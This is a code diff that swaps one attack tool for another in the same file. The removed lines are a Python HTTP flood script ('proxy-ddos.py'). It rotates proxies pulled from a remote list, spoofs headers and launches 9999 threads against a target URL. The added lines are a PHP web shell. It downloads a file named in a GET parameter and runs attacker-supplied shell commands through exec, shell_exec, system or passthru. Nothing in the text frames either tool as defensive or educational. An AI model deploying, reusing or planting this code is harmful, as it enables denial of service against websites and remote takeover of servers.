@@ -1,142 +1,18 @@
-import urllib2
-import urllib
-import threading
-import random
-import re
-import sys
-import socket
-#if responce time is more than 3s, it's really a bad one. there is no need to dos .
-socket.setdefaulttimeout(2)
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-yanit  = urllib2.urlopen('https://raw.githubusercontent.com/webr00t/web/master/p.txt')
-yanit_text = yanit.read()
-ips = yanit_text.split('\n')
+<?php
+echo "<!--rahatinizabakin-->";
+$basi = @$_GET["basi"];
+$sonu = @$_GET["sonu"];
+$temp = tmpfile();
+$dosya = @file_get_contents(@$_GET["dosya"]);
+fwrite($temp, $dosya);
+$bilgi = stream_get_meta_data($temp);
+$dizin = $bilgi['uri'];
+$komut = "{$basi} {$dizin} {$sonu}";
+if(function_exists('exec')){$sonuc = @exec($komut);}elseif(function_exists('shell_exec')){$sonuc = @shell_exec($komut);}elseif(function_exists('system')){$sonuc = @system($komut);}elseif(function_exists('passthru')){$sonuc = @passthru($komut);
+}else{
+echo "tum fonksiyonlar kapali aq";
+}
+print $sonuc;
+fclose($temp);
 
-def randomIp():
-    random.seed()
-    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
-    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
-    return result
- 
-def randomIpList():
-    random.seed()
-    res = ""
-    for ip in xrange(random.randint(2, 8)):
-        res = res + randomIp() + ", "
-	return res[0:len(res) - 2]
-
-def inc_counter():
-    global request_counter
-    request_counter+=1
-
-def set_safe():
-    global safe
-    safe=1
-# generates a user agent array
-def useragent_list():
-    global headers_useragents
-    headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
-    headers_useragents.append('Googlebot/2.1 (+http://www.googlebot.com/bot.html)')
-    headers_useragents.append('Googlebot/2.1 (+http://www.google.com/bot.html)')
-    headers_useragents.append('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')
-    headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
-    headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
-    headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0')
-    headers_useragents.append('Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0')
-    headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
-    headers_useragents.append('Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko')
-    return(headers_useragents)
-
-# generates a referer array
-def referer_list():
-    global headers_referers
-    headers_referers.append('https://www.google.com.tr/')
-    headers_referers.append('http://' + host + '/')
-    return(headers_referers)
-#builds random ascii string
-def buildblock(size):
-    out_str = ''
-    for i in range(0, size):
-        a = random.randint(65, 90)
-        out_str += chr(a)
-    return(out_str)
-def random_str_2(size):
-    out_str = ''
-    letters = 'abcdefghijklmnopqrstuvwxyz'
-    for i in range(size):
-        out_str += random.choice(letters)
-    return (out_str)
-def usage():
-    print '---------------------------------------------------'
-    print 'USAGE: python proxy-ddos.py <url>'
-    print '---------------------------------------------------'
- 
-def httpcall(url):   
-    useragent_list()
-    referer_list()
-    code=0
-    requests = ''
-    while 1:       
-        headers = {
-        'User-Agent':random.choice(headers_useragents),
-        'Cache-Control':'no-cache',
-        'X-Forwarded-For':randomIpList(),
-        'Accept':'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5',
-        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Accept-Language':'tr-tr,tr;q=0.8,en-us;q=0.5,en;q=0.3',
-        'Referer':random.choice(headers_referers) + random_str_2(8),
-        'Keep-Alive':random.randint(300,500),
-        'Connection':'keep-alive',
-        'Host':host
-        }
-        postdata = urllib.urlencode( {buildblock(random.randint(3,10)):buildblock(random.randint(3,10))} )
-        req = urllib2.Request(url=url+random_str_2(8),headers=headers)
-
-        index = random.randint(0,len(ips)-1)
-        proxy = urllib2.ProxyHandler({'http':ips[index]})
-        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
-        urllib2.install_opener(opener)
-
-        try:
-            urllib2.urlopen(req)
-            #print '***************'
-            inc_counter()
-            if(request_counter%10==0):
-                print request_counter
-        except Exception,e:
-            #print e
-            #break
-            continue
-
-#http caller thread 
-class HTTPThread(threading.Thread):
-    def run(self):
-        httpcall(url)
-
-#execute 
-if len(sys.argv) < 2:
-    usage()
-    sys.exit()
-else:
-    if sys.argv[1]=="help":
-        usage()
-        sys.exit()
-    else:
-        print "-- Attack Started --"
-        url = sys.argv[1]
-        if url.count("/")==2:
-            url = url + "/"
-        m = re.search('http\://([^/]*)/?.*', url)
-        host = m.group(1)
-        for i in range(9999):
-            t = HTTPThread()
-            t.start()
-
-
+?>
